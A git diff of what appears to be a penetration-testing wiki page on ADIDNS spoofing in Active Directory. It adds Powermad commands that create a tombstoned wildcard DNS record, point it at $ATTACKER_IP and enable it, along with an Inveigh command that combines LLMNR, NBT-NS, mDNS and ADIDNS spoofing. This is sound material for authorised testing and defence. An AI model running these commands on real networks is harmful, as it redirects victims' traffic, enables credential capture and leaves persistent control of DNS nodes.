@@ -17,31 +17,75 @@ ADIDNS zones can be remotely edited
 
 ## Practice
 
-### Wildcard recon
+### Manual record addition/edition
 
-On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to resolve names \(all DNS spoofing attacks need to be stopped in order to avoid false results\).
+On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add/view/edit/enable/disable a record. In the following examples, the wildcard \(`*`\) record is targeted but the examples should also work with other records \(except things like `WPAD` that are in the [GQBL](wpad-spoofing.md#through-adidns-spoofing)\). The standard process when creating a new record is to add the record, then set it \(populate it's DnsRecord attribute\) and then enable it.
+
+{% tabs %}
+{% tab title="Get/Read" %}
+The following command can be used to get the value populated in the DNSRecord attribute of a node.
+
+```bash
+Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord
+```
+{% endtab %}
+
+{% tab title="Add" %}
+The following command creates a wildcard record and sets the `dNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).
+
+```text
+New-ADIDNSNode -Node * -Tombstone -Verbose
+```
+{% endtab %}
+
+{% tab title="Set/Edit" %}
+The `Set-ADIDNSNodeAttribute` function can be used to append, populate, or overwrite values in a DNS node attribute. In this case, the command below can be used to set/overwrite the record's value.
+
+```bash
+Set-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Value (New-DNSRecordArray -Data $ATTACKER_IP) -Verbose
+```
+{% endtab %}
+
+{% tab title="Enable" %}
+Once a record is set and populated, it can be enable with the following command.
+
+```bash
+Enable-ADIDNSNode -Node *
+```
+{% endtab %}
+
+{% tab title="Disable" %}
+A record can be disabled \(i.e. tombstoned\) with the following command. This means the record will still exist but will not be used when resolving names.
+
+```bash
+Disable-ADIDNSNode -Node *
+```
+{% endtab %}
+
+{% tab title="Remove" %}
+The following command can be used to fully remove a record.
+
+```bash
+Remove-ADIDNSNode -Node *
+```
+{% endtab %}
+
+{% tab title="Check/Resolve" %}
+While `ping` can absolutely be used for the job, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to resolve names \(all DNS spoofing attacks need to be stopped in order to avoid false results\).
 
 ```bash
 Resolve-DnsName NameThatDoesntExist
 ```
 
 That command will either return an IP address, indicating that the wildcard record exists \(or that `NameThatDoesntExist` is an actual explicit record\), or return an error stating that the DNS name doesn't exist, indicating that the wildcard record doesn't exist.
-
-### Manuel record addition
-
-On Windows, the [Powermad ](https://github.com/Kevin-Robertson/Powermad)module can be used to manually add a record to an ADIDNS zone.
-
-The following commands creates a wildcard record and sets the `dNSTombstoned` attribute, allowing any authenticated user to perform modifications to the node \(this helps maintain control of the node, even when the owner accounts gets deleted. Pretty useful after a pentest\).
-
-```text
-New-ADIDNSNode -Node * -Tombstone -Verbose
-```
+{% endtab %}
+{% endtabs %}
 
 More help on usage, support functions, parameters and attacks [here](https://github.com/Kevin-Robertson/Powermad#adidns-functions).
 
 ### Dynamic spoofing
 
-The following command will 
+Using [Inveigh](https://github.com/Kevin-Robertson/Inveigh) \(Powershell\), the following command will 
 
 * operate [LLMNR, NBT-NS and mDNS spoofing](llmnr-nbtns-mdns.md)
 * operate ADIDNS spoofing
@@ -58,9 +102,9 @@ Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LL
 
 [This wiki page](https://github.com/Kevin-Robertson/Inveigh/wiki/Basics) can be really useful to help master Inveigh and its support functions
 
-* `Clear-Inveigh` to clear the $inveigh hashtable
-* `Get-Inveigh` to get data from the $inveigh hashtable
-* `Stop-Inveigh` to stop all running Inveigh modules
+* `Clear-Inveigh` to clear Inveigh's hashtable
+* `Get-Inveigh` to get data from Inveigh's hashtable
+* `Stop-Inveigh` to stop all running modules
 * `Watch-Inveigh` to enable real time console output
 
 ## References
@@ -68,4 +112,8 @@ Invoke-Inveigh -ConsoleOutput Y -ADIDNS combo,ns,wildcard -ADIDNSThreshold 3 -LL
 {% embed url="https://blog.netspi.com/exploiting-adidns/" %}
 
 {% embed url="https://blog.netspi.com/adidns-revisited/" %}
+
+{% embed url="https://snovvcrash.rocks/2020/12/28/htb-hades.html\#spoofing-active-directory-integrated-dns" %}
+
+
 
